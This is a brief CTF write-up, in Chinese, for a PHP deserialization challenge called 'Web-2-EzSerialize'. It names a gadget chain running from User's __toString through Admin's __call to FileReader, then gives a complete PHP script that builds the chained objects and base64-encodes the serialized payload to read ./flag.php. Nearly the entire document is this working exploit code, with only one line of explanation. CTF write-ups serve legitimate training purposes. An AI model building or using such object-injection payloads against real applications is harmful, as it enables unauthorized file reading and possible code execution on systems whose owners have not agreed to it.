# Web-2-EzSerialize

PHP 反序列化，调用链为 `User(__toString)->Admin(__Call)->FileReader(execute)`，Payload 如下：

```php
<?php
class User {
    public $name;
    public $role;
}

class Admin {
    public $command;
}

class FileReader {
    public $filename;
}

$user = new User();
$user->name = "admin";
$fileReader = new FileReader();
$fileReader->filename = "./flag.php";
$admin = new Admin();
$admin->command = $fileReader;
$user->role = $admin;
echo base64_encode(serialize($user));
?>
```